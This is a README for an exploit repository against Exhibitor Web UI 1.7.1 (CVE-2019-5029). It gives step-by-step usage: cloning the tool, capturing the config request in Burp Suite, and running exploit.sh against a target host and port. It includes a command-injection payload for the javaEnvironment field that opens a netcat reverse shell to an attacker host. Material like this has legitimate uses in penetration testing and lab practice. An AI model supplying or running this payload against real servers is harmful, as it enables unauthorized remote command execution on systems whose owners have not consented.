# Exhibitor-RCE
Exhibitor Web Ui 1.7.1 RCE, CVE-2019-5029

## Step 1:

$ git clone https://github.com/thehunt1s0n/Exihibitor-RCE/

## Step 2:

$ cd Exihibitor-RCE/

## Step 3 (optional):

You might need to edit json data payload in the script. To do that simply capture the request using burpsuite when comiting the changes in the config tab of exihibitor and copy pasting into the curl command in the script.

<div style="text-align:center;">
  <img src="https://raw.githubusercontent.com/thehunt1s0n/Exihibitor-RCE/main/media/burpsuite_capture.png" alt="gif 1" width="500"/>
</div>

Make sure to change the javaEnvironment with the following:

"javaEnvironment":"$(/bin/nc -e /bin/sh '$ATTACKER_HOST' '$ATTACKER_PORT' &)"


## Step 4:

./exploit.sh <host> <port> <attacker_host> <attacker_port>

Example:

$ ./exploit.sh 192.168.197.98 8080 192.168.45.187 8080

![gif](https://raw.githubusercontent.com/thehunt1s0n/Exihibitor-RCE/main/media/Exihibitor_capture.gif)
